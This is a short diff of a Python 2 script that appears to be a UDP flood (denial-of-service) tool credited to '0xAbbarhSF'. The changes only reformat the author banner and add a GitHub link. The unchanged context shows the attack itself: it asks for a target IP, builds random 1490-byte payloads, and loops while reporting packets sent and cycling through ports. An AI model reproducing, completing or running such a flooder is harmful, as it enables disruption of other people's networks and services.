@@ -21,10 +21,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("Dinial Pro")
 print
-print("===========°°°°°°===========")
-print("       Coded by : 0xAbbarhSF        ")
-print("          GitHub : 0xAbbarhSF          ")
-print("         Twitter : 0xAbbarhSF           ")
+print("===========°°°°°°============")
+print(" Coded by : 0xAbbarhSF       ")
+print("    GitHub : 0xAbbarhSF      ")
+print("   Twitter : 0xAbbarhSF      ")
 print("==========°°°°°°°============")
 print
 ip = raw_input("IP Target : ")
@@ -52,4 +52,4 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
+#https://github.com/0xAbbarhSF
